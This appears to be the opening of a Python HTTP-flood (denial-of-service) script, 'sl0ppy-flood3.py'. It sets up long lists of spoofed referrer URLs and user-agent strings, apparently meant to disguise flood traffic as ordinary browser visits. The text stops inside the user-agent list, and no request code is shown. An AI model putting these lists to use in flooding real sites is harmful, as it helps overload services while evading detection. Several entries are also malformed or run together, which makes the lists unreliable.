#!/usr/bin/python3
#
#  Tool name : sl0ppy-flood3.py
#  Author    : P.Hoogeveen
#  AKA       : x0xr00t
#  Team      : sl0ppyr00t
#  Build     : 20232405
#
#  Todo, add "," behind 6k UA

import urllib.request, os, threading, time, random, sys, colorama
from colorama import Fore, Style
from sys import stdout

ref = [
    'https://duckduckgo.com/',
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.yandex.ru/',
    'https://search.yahoo.com/',
    'https://www.facebook.com/',
    'https://twitter.com/',
    'https://www.youtube.com/',
    'https://www.snap.com/',
    'https://www.tiktok.com/',
    'https://www.0day.today/',
    'https://www.vulncheck.com/',
    'https://www.github.com/',
    'https://www.checkhost.com/',
    'https://godady.com',
    'https://ebay.com',
    'https://fbi.gov',
    'https://nsa.gov',
    'https://alibaba.com'
    '7eer.net',
    'ad.doubleclick.net',
    'affiliatefuture.com',
    'anrdoezrs.net',
    'apmebf.com',
    'avantlink.com',
    'bfast.com',
    'cc-dt.com',
    'cj.com',
    'cj.dotomi.com',
    'clickserve.cc-dt.com',
    'commission-junction.com',
    'doubleclick.net',
    'dpbolvw.net',
    'emjcd.com',
    'evyy.net',
    'gan.doubleclick.net',
    'go.redirectingat.com',
    'go2jump.org',
    'gopjn.com',
    'jdoqocy.com',
    'kqzyfj.com',
    'linksynergy.com',
    'ojrq.net',
    'onenetworkdirect.net',
    'partners.webmasterplan.com',
    'pjatr.com',
    'pjtra.com',
    'pntra.com',
    'pntrac.com',
    'pntrack.com',
    'qksrv.net',
    'redirect.at',
    'redirect.viglink.com',
    'redirectingat.com',
    'shareasale.com',
    'tkqlhce.com',
    'www.7eer.net',
    'www.affiliatefuture.com',
    'www.anrdoezrs.net',
    'www.apmebf.com',
    'www.avantlink.com',
    'www.bfast.com',
    'www.cc-dt.com',
    'www.cj.com',
    'www.doubleclick.net',
    'www.dpbolvw.net',
    'www.emjcd.com',
    'www.evyy.net',
    'www.gopjn.com',
    'www.jdoqocy.com',
    'www.kqzyfj.com',
    'www.linksynergy.com',
    'www.ojrq.net',
    'www.onenetworkdirect.net',
    'www.pjatr.com',
    'www.pjtra.com',
    'www.pntra.com',
    'www.pntrac.com',
    'www.pntrack.com',
    'www.qksrv.net',
    'www.tkqlhce.com',
    'tradetracker.net',
    'www.tradetracker.net',
    'click.linksynergy.com',
    'clk.tradedoubler.com',
    'tc.tradetracker.com',
    'track.adform.net',
    'track.webgains.com',
    'ad.atdmt.com',
    'clickserve.dartsearch.net',
    '5231.xg4ken.com',
    'shareasale-analytics.com',
    'www.kqzyfj.com',
    'go.skimresources.com',
    'goto-target-com.customtraffic.impactradius.com',
    'goto.target.com'
	
]
ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
	"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
	"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
	"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
	"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
	"Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a",
	"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2",
	"Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
	"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
	"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
	"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	"Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	"Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
	"Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
	"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2",
	"Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
	"Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
	"Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
	"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
	"Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
	"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
	"Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
	"Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
	"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
	"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
	"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
	"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
	"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
	"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
	"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
	"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
	"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
	"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
	"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
	"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
	"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8",
	"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7",
	"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5",
	"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330",
	"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
	"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8",
	"Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0",
	"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9",
	"Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12",
	"Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0",
	"Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
	"Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
	"Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
	"Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5",
	"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8",
	"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3",
	"Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
	"Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	"Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	"Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	"Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN",
	"Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	"/5.0 ; MSIE 9.0; Windows NT 6.0  12.14",
	"/5.0 X11; ; Linux i686; rv:26.0 Gecko/20100101 Firefox/26.0",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows NT 6.2 /535.7 KHTML,  Gecko Comodo_Dragon/16.1.1.0 /16.0.912.63 Safari/535.7",
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Linux; U;  4.0.3; -ch; HTC  /IML74K /534.30 KHTML,  Gecko /4.0  Safari/534.30",
	"/5.0 Linux; U;  2.3; -us /999+ KHTML,  Gecko Safari/999.9"
	"/5.0 Linux; U;  2.3.5; zh-; HTC_IncredibleS_S710e /GRJ90 /533.1 KHTML,  Gecko /4.0  Safari/533.1",
	"/5.0 Linux; U;  2.3.5; -us; HTC  /GRI40 /533.1 KHTML,  Gecko /4.0  Safari/533.1",
	"/5.0 Linux; U;  2.3.4; fr-fr; HTC  /GRJ22 /533.1 KHTML,  Gecko /4.0  Safari/533.1",
	"/5.0 Linux; U;  2.3.4; -us; T- myTouch 3G  /GRI40 /533.1 KHTML,  Gecko /4.0  Safari/533.1",
	"/5.0 Linux; U;  2.3.3; zh-tw; HTC_Pyramid /GRI40 /533.1 KHTML,  Gecko /4.0  Safari/533.1",
	"/5.0 Linux; U;  2.3.3; zh-tw; HTC_Pyramid /GRI40 /533.1 KHTML,  Gecko /4.0  Safari",
	"/5.0 Linux; U;  2.3.3; zh-tw; HTC  /GRI40 /533.1 KHTML,  Gecko /4.0  Safari/533.1",
	"/5.0 Linux; U;  2.3.3; ko-kr; LG-LU3000 /GRI40 /533.1 KHTML,  Gecko /4.0  Safari/533.1",
	"/5.0 Linux; U;  2.3.3; -us; HTC_DesireS_S510e /GRI40 /533.1 KHTML,  Gecko /4.0  Safari/533.1",
	"/5.0 Linux; U;  2.3.3; -us; HTC_DesireS_S510e /GRI40 /533.1 KHTML,  Gecko /4.0 ",
	"/5.0 Linux; U;  2.3.3; -; HTC  /GRI40 /533.1 KHTML,  Gecko /4.0  Safari/533.1",
	"/5.0 Linux; U;  2.3.3; -ch; HTC  /FRF91 /533.1 KHTML,  Gecko /4.0  Safari/533.1",
	"/5.0 Linux; U;  2.2; fr-; HTC  /FRF91 /533.1 KHTML,  Gecko /4.0  Safari/533.1",
	"/5.0 Linux; U;  2.2; -; HTC_DesireHD_A9191 /FRF91 /533.1 KHTML,  Gecko /4.0  Safari/533.1",
	"/5.0 Linux; U;  2.2.1; fr-fr; HTC_DesireZ_A7272 /FRG83D /533.1 KHTML,  Gecko /4.0  Safari/533.1",
	"/5.0 Linux; U;  2.2.1; -gb; HTC_DesireZ_A7272 /FRG83D /533.1 KHTML,  Gecko /4.0  Safari/533.1",
	"/5.0 Linux; U;  2.2.1; -; LG-P505R /FRG83 /533.1 KHTML,  Gecko /4.0  Safari/533.1",
	"/9.80 X11; Linux i686; /14.10 Presto/2.12.388 /12.16",
	"/9.80 Windows NT 6.0 Presto/2.12.388 /12.14",
	"/5.0 Windows NT 6.0; rv:2.0 Gecko/20100101 Firefox/4.0  12.14",
	"/5.0 ; MSIE 9.0; Windows NT 6.0  12.14",
	"/12.80 Windows NT 5.1; U;  Presto/2.10.289 /12.02",
	"/9.80 Windows NT 6.1; U; es-ES Presto/2.9.181 /12.00",
	"/9.80 Windows NT 5.1; U; zh- Presto/2.9.181 /12.00",
	"/12.0Windows NT 5.2;U;Presto/22.9.168 /12.00",
	"/12.0Windows NT 5.1;U;Presto/22.9.168 /12.00",
	"/5.0 Windows NT 5.1 Gecko/20100101 Firefox/14.0 /12.0",
	"/9.80 Windows NT 6.1; WOW64; U;  Presto/2.10.229 /11.62",
	"/9.80 Windows NT 6.0; U; pl Presto/2.10.229 /11.62",
	"/9.80 Macintosh; Intel Mac OS X 10.6.8; U; fr Presto/2.9.168 /11.52",
	"/9.80 Macintosh; Intel Mac OS X 10.6.8; U;  Presto/2.9.168 /11.52",
	"/9.80 Windows NT 5.1; U;  Presto/2.9.168 /11.51",
	"/5.0 ; MSIE 9.0; Windows NT 6.1;   11.51",
	"/9.80 X11; Linux x86_64; U; fr Presto/2.9.168 /11.50",
	"/9.80 X11; Linux i686; U;  Presto/2.9.168 /11.50",
	"/9.80 X11; Linux i686; U;  Presto/2.8.131 /11.11",
	"/9.80 X11; Linux i686; U; es-ES Presto/2.8.131 /11.11",
	"/5.0 Windows NT 5.1; U; ; rv:1.8.1 Gecko/20061208 Firefox/5.0  11.11",
	"/9.80 X11; Linux x86_64; U;  Presto/2.8.131 /11.10",
	"/9.80 Windows NT 6.0; U;  Presto/2.8.99 /11.10",
	"/9.80 Windows NT 5.1; U; zh-tw Presto/2.8.131 /11.10",
	"/9.80 Windows NT 6.1;  /15165; U;  Presto/2.8.149 /11.1",
	"/9.80 X11; Linux x86_64; U; /10.10 maverick; pl Presto/2.7.62 /11.01",
	"/9.80 X11; Linux i686; U;  Presto/2.7.62 /11.01",
	"/9.80 X11; Linux i686; U; fr Presto/2.7.62 /11.01",
	"/9.80 Windows NT 6.1; U; zh-tw Presto/2.7.62 /11.01",
	"/9.80 Windows NT 6.1; U; zh- Presto/2.7.62 /11.01",
	"/9.80 Windows NT 6.1; U; sv Presto/2.7.62 /11.01",
	"/9.80 Windows NT 6.1; U; -US Presto/2.7.62 /11.01",
	"/9.80 Windows NT 6.1; U; cs Presto/2.7.62 /11.01",
	"/9.80 Windows NT 6.0; U; pl Presto/2.7.62 /11.01",
	"/9.80 Windows NT 5.2; U;  Presto/2.7.62 /11.01",
	"/9.80 Windows NT 5.1; U; Presto/2.7.62 /11.01",
	"/9.80 Windows NT 5.1; U; cs Presto/2.7.62 /11.01",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.2.13 Gecko/20101213 /9.80 Windows NT 6.1; U; zh-tw Presto/2.7.62 /11.01",
	"/5.0 Windows NT 6.1; U; nl; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6  11.01",
	"/5.0 Windows NT 6.1; U; ; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6  11.01",
	"/4.0 ; MSIE 8.0; Windows NT 6.1;   11.01",
	"/9.80 X11; Linux x86_64; U; pl Presto/2.7.62 /11.00",
	"/9.80 X11; Linux i686; U;  Presto/2.7.62 /11.00",
	"/9.80 Windows NT 6.1; U; zh- Presto/2.6.37 /11.00",
	"/9.80 Windows NT 6.1; U; pl Presto/2.7.62 /11.00",
	"/9.80 Windows NT 6.1; U; ko Presto/2.7.62 /11.00",
	"/9.80 Windows NT 6.1; U; fi Presto/2.7.62 /11.00",
	"/9.80 Windows NT 6.1; U; -GB Presto/2.7.62 /11.00",
	"/9.80 Windows NT 6.1 x64; U;  Presto/2.7.62 /11.00",
	"/9.80 Windows NT 6.0; U;  Presto/2.7.39 /11.00",
	"/9.80 Windows NT 5.1; U;  Presto/2.7.39 /11.00",
	"/9.80 Windows NT 5.1; U; MRA 5.5  02842;  Presto/2.7.62 /11.00",
	"/9.80 Windows NT 5.1; U;  Presto/2.7.62 /11.00",
	"/5.0 Windows NT 6.0; U; ; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6  11.00",
	"/5.0 Windows NT 5.1; U; pl; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6  11.00",
	"/5.0 Windows NT 5.1; U; ; rv:1.9.1.6 Gecko/20091201 Firefox/3.5.6  11.00",
	"/4.0 ; MSIE 8.0; X11; Linux x86_64; pl  11.00",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; fr  11.00",
	"/4.0 ; MSIE 8.0; Windows NT 6.0;   11.00",
	"/4.0 ; MSIE 8.0; Windows NT 6.0;   11.00"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; pl  11.00",
	"/9.80 Windows NT 6.1; U; pl Presto/2.6.31 /10.70",
